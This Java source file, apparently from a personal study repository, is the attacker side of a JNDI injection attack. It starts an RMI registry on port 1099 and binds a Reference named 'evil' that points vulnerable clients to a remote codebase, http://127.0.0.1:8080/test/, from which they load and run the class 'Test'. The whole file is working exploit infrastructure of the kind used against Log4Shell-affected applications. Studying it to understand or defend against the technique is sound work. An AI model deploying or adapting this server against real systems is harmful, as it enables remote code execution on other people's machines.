package com.accumulate.personal.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

/**
 * RmiServer
 *
 * @author zhutao
 * @date 2021/12/14 7:20 下午
 */
public class RmiServer {


    public static void main(String[] args)
            throws RemoteException, NamingException, AlreadyBoundException {


        // 本地主机上的远程对象注册表Registry的实例,默认端口1099
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        System.out.println("Create RMI registry on port 1099");
        //返回的Java对象 第一个参数为包路径

//        http://127.0.0.1:8080/test
//        Test.class
        Reference reference = new Reference("Test","Test","http://127.0.0.1:8080/test/");

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        // 把远程对象注册到RMI注册服务器上，并命名为evil
        registry.bind("evil",referenceWrapper);
    }
}
